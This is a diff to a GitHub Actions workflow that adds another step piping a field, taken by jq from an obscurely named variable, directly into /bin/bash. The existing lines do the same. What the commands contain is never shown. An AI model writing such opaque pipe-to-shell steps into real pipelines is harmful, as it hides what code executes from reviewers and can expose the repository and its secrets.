@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$wr11" | jq -r .axx85588 | /bin/bash
           echo $w4 | jq -r .aao7850 | /bin/bash
           printf '%s' "$phxy34943" | jq -r .typn36 | /bin/bash
+          printf '%s' "$sc2438" | jq -r .itrvr1 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
